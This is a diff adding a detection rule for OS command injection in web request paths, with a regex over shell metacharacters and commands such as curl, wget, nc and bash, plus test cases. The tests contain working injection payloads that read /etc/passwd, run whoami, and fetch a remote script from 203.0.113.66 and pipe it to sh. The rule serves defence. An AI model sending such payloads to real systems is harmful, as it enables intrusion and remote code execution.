@@ -1,0 +1,39 @@
+title: OS command injection attempt
+id: command-injection
+status: stable
+description: >
+  A shell metacharacter that starts a new command (; | || && ` $() followed by
+  a command attackers reach for first: recon (id, whoami, uname), file reads,
+  or fetching a second stage (curl, wget). Requiring both halves keeps a stray
+  ";" or "|" in a normal query quiet. ${IFS} is the space-free evasion trick
+  and suspicious on its own.
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+tags:
+  - attack.execution
+  - attack.t1059.004
+logsource:
+  product: argus
+detection:
+  chained_command:
+    path|urldecode|re|i: '(;|\|\|?|&&|`|\$\()\s*(cat|ls|id|whoami|uname|hostname|wget|curl|nc|ncat|bash|sh|zsh|python[23]?|perl|php|ping|nslookup|rm|chmod|echo)\b'
+  ifs_evasion:
+    path|urldecode|contains: '${IFS}'
+  condition: 1 of them
+falsepositives:
+  - Admin tools that legitimately take shell snippets as parameters
+level: high
+argus:
+  message: 'OS command injection attempt from {sourceIp}: {path}'
+tests:
+  match:
+    - path: /api/ping?host=127.0.0.1;cat%20/etc/passwd
+    - path: /api/ping?host=8.8.8.8|id
+    - path: /cgi-bin/status?cmd=%60whoami%60
+    - path: /api/export?name=report$(curl%20http://203.0.113.66/x.sh|sh)
+    - path: /api/ping?host=1.1.1.1&&wget%20http://203.0.113.66/a
+    - path: /api/run?c=cat${IFS}/etc/passwd
+  nomatch:
+    - path: /search?q=how+to+use+the+id+command
+    - path: /api/items?sort=name;asc
+    - path: /api/orders?id=42
